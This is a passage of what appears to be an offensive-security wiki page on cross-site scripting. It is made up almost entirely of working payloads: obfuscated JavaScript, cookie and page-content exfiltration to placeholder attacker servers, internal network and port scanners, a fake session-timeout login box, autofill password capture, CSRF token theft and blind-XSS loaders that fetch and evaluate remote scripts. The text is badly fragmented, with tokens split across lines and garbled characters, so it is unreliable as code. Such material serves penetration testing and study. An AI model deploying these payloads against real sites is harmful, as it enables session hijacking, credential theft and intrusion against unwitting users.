+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[[\n+!+\n[]]\n+\n[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]]\n+\n[\n+\n[]]\n+\n([][([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n([][[]]\n+\n[])[\n+!+\n[]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]\n+\n([][[]]\n+\n[])[\n+\n[]]\n+\n([][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!!\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[][(\n!\n[]\n+\n[])[\n+\n[]]\n+\n([\n!\n[]]\n+\n[][[]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!\n[]\n+\n[])[\n!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n!+\n[]\n+!+\n[]\n+!+\n[]]\n+\n(\n!+\n[]\n+\n[])[\n+!+\n[]]])[\n+!+\n[]\n+\n[\n+\n[]]]\n+\n(\n!!\n[]\n+\n[])[\n+!+\n[]]]\n+\n[])[[\n+!+\n[]]\n+\n[\n!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]\n+!+\n[]]])()\n</\nscript\n>\n//aaencode\nÔæüœâÔæüÔæâ\n=\n/\nÔΩÄÔΩç¬¥ÔºâÔæâ\n~\n‚îª‚îÅ‚îª\n//*¬¥‚àáÔΩÄ*/ ['_']; o=(ÔæüÔΩ∞Ôæü)  =_=3; c=(ÔæüŒòÔæü) =(ÔæüÔΩ∞Ôæü)-(ÔæüÔΩ∞Ôæü); (Ôæü–îÔæü) =(ÔæüŒòÔæü)= (o^_^o)/ (o^_^o);(Ôæü–îÔæü)={ÔæüŒòÔæü: '_' ,ÔæüœâÔæüÔæâ : ((ÔæüœâÔæüÔæâ==3) +'_') [ÔæüŒòÔæü] ,ÔæüÔΩ∞ÔæüÔæâ :(ÔæüœâÔæüÔæâ+ '_')[o^_^o -(ÔæüŒòÔæü)] ,Ôæü–îÔæüÔæâ:((ÔæüÔΩ∞Ôæü==3) +'_')[ÔæüÔΩ∞Ôæü] }; (Ôæü–îÔæü) [ÔæüŒòÔæü] =((ÔæüœâÔæüÔæâ==3) +'_') [c^_^o];(Ôæü–îÔæü) ['c'] = ((Ôæü–îÔæü)+'_') [ (ÔæüÔΩ∞Ôæü)+(ÔæüÔΩ∞Ôæü)-(ÔæüŒòÔæü) ];(Ôæü–îÔæü) ['o'] = ((Ôæü–îÔæü)+'_') [ÔæüŒòÔæü];(ÔæüoÔæü)=(Ôæü–îÔæü) ['c']+(Ôæü–îÔæü) ['o']+(ÔæüœâÔæüÔæâ +'_')[ÔæüŒòÔæü]+ ((ÔæüœâÔæüÔæâ==3) +'_') [ÔæüÔΩ∞Ôæü] + ((Ôæü–îÔæü) +'_') [(ÔæüÔΩ∞Ôæü)+(ÔæüÔΩ∞Ôæü)]+ ((ÔæüÔΩ∞Ôæü==3) +'_') [ÔæüŒòÔæü]+((ÔæüÔΩ∞Ôæü==3) +'_') [(ÔæüÔΩ∞Ôæü) - (ÔæüŒòÔæü)]+(Ôæü–îÔæü) ['c']+((Ôæü–îÔæü)+'_') [(ÔæüÔΩ∞Ôæü)+(ÔæüÔΩ∞Ôæü)]+ (Ôæü–îÔæü) ['o']+((ÔæüÔΩ∞Ôæü==3) +'_') [ÔæüŒòÔæü];(Ôæü–îÔæü) ['_'] =(o^_^o) [ÔæüoÔæü] [ÔæüoÔæü];(ÔæüŒµÔæü)=((ÔæüÔΩ∞Ôæü==3) +'_') [ÔæüŒòÔæü]+ (Ôæü–îÔæü) .Ôæü–îÔæüÔæâ+((Ôæü–îÔæü)+'_') [(ÔæüÔΩ∞Ôæü) + (ÔæüÔΩ∞Ôæü)]+((ÔæüÔΩ∞Ôæü==3) +'_') [o^_^o -ÔæüŒòÔæü]+((ÔæüÔΩ∞Ôæü==3) +'_') [ÔæüŒòÔæü]+ (ÔæüœâÔæüÔæâ +'_') [ÔæüŒòÔæü]; (ÔæüÔΩ∞Ôæü)+=(ÔæüŒòÔæü); (Ôæü–îÔæü)[ÔæüŒµÔæü]='\\\\'; (Ôæü–îÔæü).ÔæüŒòÔæüÔæâ=(Ôæü–îÔæü+ ÔæüÔΩ∞Ôæü)[o^_^o -(ÔæüŒòÔæü)];(oÔæüÔΩ∞Ôæüo)=(ÔæüœâÔæüÔæâ +'_')[c^_^o];(Ôæü–îÔæü) [ÔæüoÔæü]='\\\"';(Ôæü–îÔæü) ['_'] ( (Ôæü–îÔæü) ['_'] (ÔæüŒµÔæü+(Ôæü–îÔæü)[ÔæüoÔæü]+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüÔΩ∞Ôæü)+ (ÔæüŒòÔæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (ÔæüÔΩ∞Ôæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüÔΩ∞Ôæü)+ ((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ÔæüŒòÔæü))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((o^_^o) +(o^_^o))+ (ÔæüÔΩ∞Ôæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (c^_^o)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüÔΩ∞Ôæü)+ ((o^_^o) - (ÔæüŒòÔæü))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüŒòÔæü)+ (c^_^o)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüÔΩ∞Ôæü)+ ((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (ÔæüÔΩ∞Ôæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (ÔæüÔΩ∞Ôæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ ((ÔæüÔΩ∞Ôæü) + (o^_^o))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (ÔæüÔΩ∞Ôæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüÔΩ∞Ôæü)+ (c^_^o)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüŒòÔæü)+ ((o^_^o) - (ÔæüŒòÔæü))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüÔΩ∞Ôæü)+ (ÔæüŒòÔæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüÔΩ∞Ôæü)+ (ÔæüŒòÔæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((o^_^o) - (ÔæüŒòÔæü))+ (o^_^o)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ (ÔæüÔΩ∞Ôæü)+ (o^_^o)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ÔæüŒòÔæü))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (ÔæüŒòÔæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüŒòÔæü)+ ((o^_^o) +(o^_^o))+ (ÔæüÔΩ∞Ôæü)+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+(ÔæüÔΩ∞Ôæü)+ ((o^_^o) - (ÔæüŒòÔæü))+ (Ôæü–îÔæü)[ÔæüŒµÔæü]+((ÔæüÔΩ∞Ôæü) + (ÔæüŒòÔæü))+ (ÔæüŒòÔæü)+ (Ôæü–îÔæü)[ÔæüoÔæü]) (ÔæüŒòÔæü)) ('_');\n// It's also possible to execute JS code only with the chars: []`+!${}\nXSS common payloads\nSeveral payloads in 1\nSteal Info JS\nRetrieve Cookies\n<\nimg src\n=\nx onerror\n=\nthis\n.\nsrc\n=\n\"http://<YOUR_SERVER_IP>/?c=\"\n+\ndocument\n.\ncookie\n>\n<\nimg src\n=\nx onerror\n=\n\"location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie\"\n>\n<\nscript\n>\nnew\nImage\n().\nsrc\n=\n\"http://<IP>/?c=\"\n+\nencodeURI\n(\ndocument\n.\ncookie\n);\n</\nscript\n>\n<\nscript\n>\nnew\nAudio\n().\nsrc\n=\n\"http://<IP>/?c=\"\n+\nescape\n(\ndocument\n.\ncookie\n);\n</\nscript\n>\n<\nscript\n>\nlocation\n.\nhref\n=\n'http://<YOUR_SERVER_IP>/Stealer.php?cookie='\n+\ndocument\n.\ncookie\n</\nscript\n>\n<\nscript\n>\nlocation\n=\n'http://<YOUR_SERVER_IP>/Stealer.php?cookie='\n+\ndocument\n.\ncookie\n</\nscript\n>\n<\nscript\n>\ndocument\n.\nlocation\n=\n'http://<YOUR_SERVER_IP>/Stealer.php?cookie='\n+\ndocument\n.\ncookie\n</\nscript\n>\n<\nscript\n>\ndocument\n.\nlocation\n.\nhref\n=\n'http://<YOUR_SERVER_IP>/Stealer.php?cookie='\n+\ndocument\n.\ncookie\n</\nscript\n>\n<\nscript\n>\ndocument\n.\nwrite\n(\n'<img src=\"http://<YOUR_SERVER_IP>?c='\n+\ndocument\n.\ncookie\n+\n'\" />'\n)\n</\nscript\n>\n<\nscript\n>\nwindow\n.\nlocation\n.\nassign\n(\n'http://<YOUR_SERVER_IP>/Stealer.php?cookie='\n+\ndocument\n.\ncookie\n)\n</\nscript\n>\n<\nscript\n>\nwindow\n[\n'location'\n][\n'assign'\n](\n'http://<YOUR_SERVER_IP>/Stealer.php?cookie='\n+\ndocument\n.\ncookie\n)\n</\nscript\n>\n<\nscript\n>\nwindow\n[\n'location'\n][\n'href'\n](\n'http://<YOUR_SERVER_IP>/Stealer.php?cookie='\n+\ndocument\n.\ncookie\n)\n</\nscript\n>\n<\nscript\n>\ndocument\n.\nlocation\n=\n[\n\"http://<YOUR_SERVER_IP>?c\"\n,\ndocument\n.\ncookie\n].\njoin\n()\n</\nscript\n>\n<\nscript\n>\nvar\ni\n=\nnew\nImage\n();\ni\n.\nsrc\n=\n\"http://<YOUR_SERVER_IP>/?c=\"\n+\ndocument\n.\ncookie\n</\nscript\n>\n<\nscript\n>\nwindow\n.\nlocation\n=\n\"https://<SERVER_IP>/?c=\"\n.\nconcat\n(\ndocument\n.\ncookie\n)\n</\nscript\n>\n<\nscript\n>\nvar\nxhttp\n=\nnew\nXMLHttpRequest\n();\nxhttp\n.\nopen\n(\n\"GET\"\n,\n\"http://<SERVER_IP>/?c=\"\n%\n2Bdocument\n.\ncookie\n,\ntrue\n);\nxhttp\n.\nsend\n();\n</\nscript\n>\n<\nscript\n>\neval\n(\natob\n(\n'ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'\n));\n</\nscript\n>\n<\nscript\n>\nfetch\n(\n'https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net'\n,\n{\nmethod\n:\n'POST'\n,\nmode\n:\n'no-cors'\n,\nbody\n:\ndocument\n.\ncookie\n});\n</\nscript\n>\n<\nscript\n>\nnavigator\n.\nsendBeacon\n(\n'https://ssrftest.com/x/AAAAA'\n,\ndocument\n.\ncookie\n)\n</\nscript\n>\nYou\nwon't be able to access the cookies from JavaScript\nif the HTTPOnly flag is set in the cookie. But here you have\nsome ways to bypass this protection\nif you are lucky enough.\nSteal Page Content\nvar\nurl\n=\n\"http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8\"\n;\nvar\nattacker\n=\n\"http://10.10.14.8/exfil\"\n;\nvar\nxhr\n=\nnew\nXMLHttpRequest\n();\nxhr\n.\nonreadystatechange\n=\nfunction\n()\n{\nif\n(\nxhr\n.\nreadyState\n==\nXMLHttpRequest\n.\nDONE\n)\n{\nfetch\n(\nattacker\n+\n\"?\"\n+\nencodeURI\n(\nbtoa\n(\nxhr\n.\nresponseText\n)))\n}\n}\nxhr\n.\nopen\n(\n'GET'\n,\nurl\n,\ntrue\n);\nxhr\n.\nsend\n(\nnull\n);\nFind internal IPs\n<\nscript\n>\nvar\nq\n=\n[]\nvar\ncollaboratorURL\n=\n'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net'\n;\nvar\nwait\n=\n2000\nvar\nn_threads\n=\n51\n‚Äã\n// Prepare the fetchUrl functions to access all the possible\nfor\n(\ni\n=\n1\n;\ni\n<=\n255\n;\ni\n++\n){\nq\n.\npush\n(\nfunction\n(\nurl\n){\nreturn\nfunction\n(){\nfetchUrl\n(\nurl\n,\nwait\n);\n}\n}(\n'http://192.168.0.'\n+\ni\n+\n':8080'\n));\n}\n‚Äã\n// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q\nfor\n(\ni\n=\n1\n;\ni\n<=\nn_threads\n;\ni\n++\n){\nif\n(\nq\n.\nlength\n)\nq\n.\nshift\n()();\n}\n‚Äã\nfunction\nfetchUrl\n(\nurl\n,\nwait\n){\nconsole\n.\nlog\n(\nurl\n)\nvar\ncontroller\n=\nnew\nAbortController\n(),\nsignal\n=\ncontroller\n.\nsignal\n;\nfetch\n(\nurl\n,\n{\nsignal\n}).\nthen\n(\nr\n=>\nr\n.\ntext\n().\nthen\n(\ntext\n=>\n{\nlocation\n=\ncollaboratorURL\n+\n'?ip='\n+\nurl\n.\nreplace\n(\n/\n^http:\\/\\/\n/\n,\n''\n)\n+\n'&code='\n+\nencodeURIComponent\n(\ntext\n)\n+\n'&'\n+\nDate\n.\nnow\n()\n}\n))\n.\ncatch\n(\ne\n=>\n{\nif\n(\n!\nString\n(\ne\n).\nincludes\n(\n\"The user aborted a request\"\n)\n&&\nq\n.\nlength\n)\n{\nq\n.\nshift\n()();\n}\n});\n‚Äã\nsetTimeout\n(\nx\n=>\n{\ncontroller\n.\nabort\n();\nif\n(\nq\n.\nlength\n)\n{\nq\n.\nshift\n()();\n}\n},\nwait\n);\n}\n</\nscript\n>\nPort Scanner (fetch)\nconst\ncheckPort\n=\n(\nport\n)\n=>\n{\nfetch\n(\nhttp\n://\nlocalhost\n:\n$\n{\nport\n},\n{\nmode\n:\n\"no-cors\"\n}).\nthen\n(()\n=>\n{\nlet\nimg\n=\ndocument\n.\ncreateElement\n(\n\"img\"\n);\nimg\n.\nsrc\n=\nhttp\n://\nattacker\n.\ncom\n/\nping\n?\nport\n=\n$\n{\nport\n};\n});\n}\nfor\n(\nlet\ni\n=\n0\n;\ni\n<\n1000\n;\ni\n++\n)\n{\ncheckPort\n(\ni\n);\n}\nPort Scanner (websockets)\nvar ports\n=\n[\n80\n,\n443\n,\n445\n,\n554\n,\n3306\n,\n3690\n,\n1234\n];\nfor\n(\nvar i\n=\n0\n;\ni\n<\nports\n.\nlength\n;\ni\n++\n)\n{\nvar s\n=\nnew WebSocket\n(\n\"wss://192.168.1.1:\"\n+\nports\n[\ni\n]);\ns\n.\nstart\n=\nperformance\n.\nnow\n();\ns\n.\nport\n=\nports\n[\ni\n];\ns\n.\nonerror\n=\nfunction\n()\n{\nconsole\n.\nlog\n(\n\"Port \"\n+\nthis\n.\nport\n+\n\": \"\n+\n(\nperformance\n.\nnow\n()\n-\nthis\n.\nstart\n)\n+\n\" ms\"\n);\n};\ns\n.\nonopen\n=\nfunction\n()\n{\nconsole\n.\nlog\n(\n\"Port \"\n+\nthis\n.\nport\n+\n\": \"\n+\n(\nperformance\n.\nnow\n()\n-\nthis\n.\nstart\n)\n+\n\" ms\"\n);\n};\n}\nShort times indicate a responding port\nLonger times indicate no response.\nReview the list of ports banned in Chrome\nhere\nand in Firefox\nhere\n.\nBox to ask for credentials\n<\nstyle\n>\n::placeholder\n{\ncolor\n:\nwhite\n;\n}\n</\nstyle\n>\n<\nscript\n>\ndocument\n.\nwrite\n(\n\"<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>\"\n)\n</\nscript\n>\nAuto-fill passwords capture\n<\nb\n>\nUsername\n:</><\nbr\n>\n<\ninput name\n=\nusername id\n=\nusername\n>\n<\nb\n>\nPassword\n:</><\nbr\n>\n<\ninput type\n=\npassword name\n=\npassword onchange\n=\n\"\nif\n(\nthis\n.\nvalue\n.\nlength\n)\nfetch\n(\n'https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net'\n,{\nmethod\n:\n'POST'\n,\nmode\n:\n'no-cors'\n,\nbody\n:\nusername\n.\nvalue\n+\n':'\n+\nthis\n.\nvalue\n});\n\"\n>\nWhen any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.\nKeylogger\nJust searching in github I found a few different ones:\n‚Äã\nhttps://github.com/JohnHoder/Javascript-Keylogger\n‚Äã\n‚Äã\nhttps://github.com/rajeshmajumdar/keylogger\n‚Äã\n‚Äã\nhttps://github.com/hakanonymos/JavascriptKeylogger\n‚Äã\nYou can also use metasploit\nhttp_javascript_keylogger\nStealing CSRF tokens\n<\nscript\n>\nvar\nreq\n=\nnew\nXMLHttpRequest\n();\nreq\n.\nonload\n=\nhandleResponse\n;\nreq\n.\nopen\n(\n'get'\n,\n'/email'\n,\ntrue\n);\nreq\n.\nsend\n();\nfunction\nhandleResponse\n()\n{\nvar\ntoken\n=\nthis\n.\nresponseText\n.\nmatch\n(\n/\nname=\"csrf\" value=\"(\\w+)\"\n/\n)[\n1\n];\nvar\nchangeReq\n=\nnew\nXMLHttpRequest\n();\nchangeReq\n.\nopen\n(\n'post'\n,\n'/email/change-email'\n,\ntrue\n);\nchangeReq\n.\nsend\n(\n'csrf='\n+\ntoken\n+\n'&\n[email¬†protected]\n'\n)\n};\n</\nscript\n>\nStealing PostMessage messages\n<\nimg\nsrc\n=\n\"\nhttps://attacker.com/?\n\"\nid\n=\nmessage\n>\n<\nscript\n>\nwindow\n.\nonmessage\n=\nfunction\n(\ne\n){\ndocument\n.\ngetElementById\n(\n\"message\"\n).\nsrc\n+=\n\"&\"\n+\ne\n.\ndata\n;\n</\nscript\n>\nAbusing Service Workers\nAbusing Service Workers\nAccessing Shadow DOM\nShadow DOM\nPolyglots\nAuto_Wordlists/xss_polyglots.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nBlind XSS payloads\nYou can also use:\nhttps://xsshunter.com/\n‚Äã\n\">\n<\nimg\nsrc\n=\n'\n//domain/xss\n'\n>\n\">\n<\nscript\nsrc\n=\n\"\n//domain/xss.js\n\"\n>\n</\nscript\n>\n>\n<\na\nhref\n=\n\"\njavascript:eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'//domain\\';d.body.appendChild(_)')\n\"\n>\nClick Me For An Awesome Time\n</\na\n>\n<\nscript\n>\nfunction\nb\n(){\neval\n(\nthis\n.\nresponseText\n)};\na\n=\nnew\nXMLHttpRequest\n();\na\n.\naddEventListener\n(\n\"load\"\n,\nb\n);\na\n.\nopen\n(\n\"GET\"\n,\n\"//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb\"\n);\na\n.\nsend\n();\n</\nscript\n>\n‚Äã\n<!-- html5sec - Self-executing focus event via autofocus: -->\n\">\n<\ninput\nonfocus\n=\n\"\neval\n(\n'd=document; _ = d.createElement(\\'script\\');_.src=\\'\\/\\/domain/m\\';d.body.appendChild(_)'\n)\n\"\nautofocus\n>\n‚Äã\n<!-- html5sec - JavaScript execution via iframe and onload -->\n\">\n<\niframe\nonload\n=\n\"\neval\n(\n'd=document; _=d.createElement(\\'script\\');_.src=\\'\\/\\/domain/m\\';d.body.appendChild(_)'\n)\n\"\n>\n‚Äã\n<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->\n\">\n<\nsvg\nonload\n=\n\"\njavascript\n:\neval\n(\n'd=document; _ = d.createElement(\\'script\\');_.src=\\'//domain\\';d.body.appendChild(_)'\n)\n\"\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\n>\n</\nsvg\n>\n‚Äã\n<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->\n\">\n<\nvideo\n>\n<\nsource\nonerror\n=\n\"\neval\n(\n'd=document; _ = d.createElement(\\'script\\');_.src=\\'//domain\\';d.body.appendChild(_)'\n)\n\"\n>\n‚Äã\n<!--  html5sec - eventhandler -  element fires an \"onpageshow\" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->\n\">\n<\nbody\nonpageshow\n=\n\"\neval('d=document; _ = d.createElement(\\'script\\');_.src=\\'//domain\\';d.body.appendChild(_)')\n\"\n>\n‚Äã\n<!-- xsshunter.com - Sites that use JQuery -->\n<\nscript\n>\n$\n.\ngetScript\n(\n\"//domain\"\n)\n</\nscript\n>\n‚Äã\n<!-- xsshunter.com - When <script> is filtered -->\n\">\n<\nimg\nsrc\n=\nx\nid\n=\npayload\n&#61;&#61;\nonerror\n=\neval\n(\natob\n(\nthis\n.\nid\n))\n>\n‚Äã\n<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->\n\">\n<\ninput\nonfocus\n=\neval\n(\natob\n(\nthis\n.\nid\n))\nid\n=\npayload\n&#61;&#61;\nautofocus\n>\n‚Äã\n<!-- noscript trick -->\n<\nnoscript\n>\n<\np\ntitle=\"<\n/\nnoscript\n>\n<img\nsrc\n=\nx\nonerror\n=\nalert\n(\n1\n)\n>\n\"\n>\n‚Äã\n<!-- whitelisted CDNs in CSP -->\n\">\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js\n\"\n>\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttps://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js\n\"\n>\n</\nscript\n>\n<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->\n<\ndiv\nng-app\nng-csp\n>\n<\ntextarea\nautofocus\nng-focus\n=\n\"\nd=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'\n\"\n>\n</\ntextarea\n>\n</\ndiv\n>\nRegex - Access Hidden Content\nFrom\nthis writeup\nit's possible to learn that even if some values disappear from JS, it's still possible to find them in JS attributes in different objects. For example, an input of a REGEX is still possible to find it after the value of the input of the regex was removed:\n// Do regex with flag\nflag\n=\n\"CTF{FLAG}\"\nre\n=\n/\n.\n/\ng\nre\n.\ntest\n(\nflag\n);\n‚Äã\n// Remove flag value, nobody will be able to get it, right?\nflag\n=\n\"\"\n‚Äã\n// Access previous regex input\nconsole\n.\nlog\n(\nRegExp\n.\ninput\n)\nconsole\n.\nlog\n(\nRegExp\n.\nrightContext\n)\nconsole\n.\nlog\n(\ndocument\n.\nall\n[\n\"0\"\n][\n\"ownerDocument\"\n][\n\"defaultView\"\n][\n\"RegExp\"\n][\n\"rightContext\"\n])\nBrute-Force List\nAuto_Wordlists/xss.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nXSS Abusing other vulnerabilities\nXSS in Markdown\nCan inject Markdown code that will be renderer? Maybe you you can get XSS! Check:\nXSS in Markdown\nXSS to SSRF\nGot XSS on a\nsite that uses caching\n? Try\nupgrading that to SSRF\nthrough Edge Side Include Injection with this payload:\n<\nesi\n:\ninclude src\n=\n\"http://yoursite.com/capture\"\n/>\nUse it to bypass cookie restrictions, XSS filters and much more!\nMore information about this technique here:\nXSLT\n.\nXSS in dynamic created PDF\nIf a web page is creating a PDF using user controlled input, you can try to\ntrick the bot\nthat is creating the PDF into\nexecuting arbitrary JS code\n.\nSo, if the\nPDF creator bot finds\nsome kind of\nHTML\ntags\n, it is going to\ninterpret\nthem, and you can\nabuse\nthis behaviour to cause a\nServer XSS\n.\nServer Side XSS (Dynamic PDF)\nIf you cannot inject HTML tags it could be worth it to try to\ninject PDF data\n:\nPDF Injection\nXSS in Amp4Email\nAMP is a technology known for developing super fast web pages on mobile clients.\nAMP is a set of HTML tags backed by JavaScript\nthat easily enables functionality with an added focus on performance and security. There are\nAMP components\nfor everything from carousels, to responsive form elements, to retrieving fresh content from remote endpoints.\nThe\nAMP for Email\nformat provides\na subset of AMP components\nthat you can use in email messages. Recipients of AMP emails can view and interact with the AMP components directly in the email.\nExample\nwriteup XSS in Amp4Email in Gmail\n.\nXSS uploading files (svg)\nUpload as an image a file like the following one (from\nhttp://ghostlulz.com/xss-svg/\n):\nContent-Type: multipart/form-data; boundary=---------------------------232181429808\nContent-Length: 574\n-----------------------------232181429808\nContent-Disposition: form-data; name=\"img\"; filename=\"img.svg\"\nContent-Type: image/svg+xml\n‚Äã\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!\nDOCTYPE\nsvg\nPUBLIC\n\"-//W3C//DTD SVG 